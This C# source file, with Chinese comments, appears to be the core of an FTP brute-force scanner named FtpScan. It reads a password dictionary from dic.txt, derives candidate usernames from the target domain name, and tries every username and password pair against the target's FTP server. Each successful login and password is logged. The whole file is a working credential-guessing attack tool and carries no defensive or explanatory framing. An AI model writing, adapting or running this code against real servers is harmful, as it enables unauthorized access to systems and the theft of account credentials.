using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Windows.Forms;
using System.Text.RegularExpressions;
namespace FtpScan
{
    public delegate void WriteLog(string log);
    /// <summary>
    /// ftp对象
    /// </summary>
    public class Ftp
    {
        public static int ScaningThreadCount;
        public static event WriteLog WriteLog;
        /// <summary>
        /// 密码字典
        /// </summary>
        private List<string> dic;
        /// <summary>
        /// 获取密码字典
        /// </summary>
        /// <returns></returns>
        public static List<string> GetPwdList()
        {
            string dicpath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "dic.txt");
            WriteLog("读取密码字典");
            if (!File.Exists(dicpath))
            {
                WriteLog("字典文件不存在！\n没有找到dic.txt");
                System.Threading.Thread.CurrentThread.Abort();
            }
            FileStream fs = new FileStream(dicpath, FileMode.Open);
            StreamReader sr = new StreamReader(fs);
            List<string> dic = new List<string>();
            while (!sr.EndOfStream)
            {
                dic.Add(sr.ReadLine());
            }
            sr.Close();
            sr.Dispose();
            fs.Close();
            fs.Dispose();
            return dic;
        }
        /// <summary>
        /// 初始化
        /// </summary>
        /// <param name="domainName">域名</param>
        /// <param name="Dic">密码字典</param>
        public Ftp(string domainName, List<string> dictionary)
        {
            this.Doman = domainName;
            this.dic = dictionary;
        }


        /// <summary>
        /// 域名
        /// </summary>
        public string Doman
        { get; set; }

        /// <summary>
        /// 用户名
        /// </summary>
        public string UserName
        { get; set; }
        /// <summary>
        /// 密码
        /// </summary>
        public string Pwd
        { get; set; }
        /// <summary>
        /// 是否通过
        /// </summary>
        public bool IsPass
        { get; set; }

        /// <summary>
        /// 用于从域名中提取用户名
        /// </summary>
        static Regex findUser = new Regex(@"[.]?\w+[-]?\w+[.]", RegexOptions.Compiled);

        //获取密码字典
        public List<string> GetCurrDIC(string doman)
        {
            List<string> dictemp = new List<string>();
            foreach (var item in dic)
            {
                string name = findUser.Match(doman.Replace("www.", "").Replace("bbs.", "")).Value.Replace(".", "");
                dictemp.Add(item.Replace("%user%", name));

            }
            return dictemp;
        }

        private int inteval = 2000;
        /// <summary>
        /// 超时时间
        /// </summary>
        public int Inteval
        {
            get { return inteval; }
            set { inteval = value; }
        }
        /// <summary>
        /// 填充密码字典
        /// </summary>
        /// <param name="item"></param>
        public void TestPwd(object obj)
        {
            System.Threading.Interlocked.Increment(ref ScaningThreadCount);
            WriteLog("开始任务:" + this.Doman);
            //获取当前域名用户名密码列表
            List<string> dictemp = GetCurrDIC(this.Doman);
            //遍历用户名
            foreach (var username in dictemp)
            {
                //遍历密码
                foreach (var pwd in dictemp)
                {
                    FtpWebRequest ftp = (FtpWebRequest)FtpWebRequest.Create(new Uri("ftp://" + Doman));


                    ftp.KeepAlive = false;
                    //获取一个列表
                    ftp.Method ="LIST";
                    //UseBinary: true，指示服务器要传输的是二进制数据；false，指示数据为文本。默认值为 true。
                    ftp.UseBinary = true;
                    //指定用户标识
                    ftp.Credentials = new NetworkCredential(username, pwd);
                    //设定超时时间
                    ftp.Timeout = inteval;
                    try
                    { 
                        ftp.GetResponse();
                        this.IsPass = true;
                        this.Pwd = pwd;
                        this.UserName = username;
                        //直接退出
                        WriteLog(this.Doman + ":成功!用户名:" + username + " 密码:" + pwd);
                        System.Threading.Interlocked.Decrement(ref ScaningThreadCount);
                        return;
                    }
                    catch (Exception ex)
                    {
                        this.IsPass = false;
                        if (ex.Message.Contains("无法连接"))
                        {
                            WriteLog(this.Doman + ":" + ex.Message);
                            //如果超时 
                            WriteLog(this.Doman + ":任务退出");
                            System.Threading.Interlocked.Decrement(ref ScaningThreadCount);
                            return;
                        }
                    }
                }
            }
            System.Threading.Interlocked.Decrement(ref ScaningThreadCount);
        }
    }


}
